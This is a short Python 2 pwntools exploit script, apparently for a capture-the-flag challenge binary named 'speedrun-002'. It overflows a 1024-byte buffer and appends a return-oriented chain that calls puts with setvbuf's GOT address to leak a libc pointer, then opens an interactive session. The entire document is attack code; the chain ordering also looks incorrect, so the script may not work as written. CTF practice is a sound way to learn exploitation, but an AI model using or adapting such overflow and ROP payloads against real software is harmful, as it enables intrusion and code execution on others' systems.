from pwn import *

e = ELF("speedrun-002")
p = process("speedrun-002")

print e.symbols

for symbol in e.symbols:
	#print "HAHA"
	print symbol, hex(e.symbols[symbol])

data = p.recv()
print data

puts_plt = e.symbols['plt.puts']
addr_got = e.symbols['got.setvbuf']
pop_rdi = int("0x4008a3", 16)

buf = 'Everything intelligent is so boring.\n'+'A'*(1024+8)

payload = buf+p64(puts_plt)+p64(pop_rdi)+p64(addr_got)

p.sendline(payload)

data = p.recv()
print data
p.interactive()
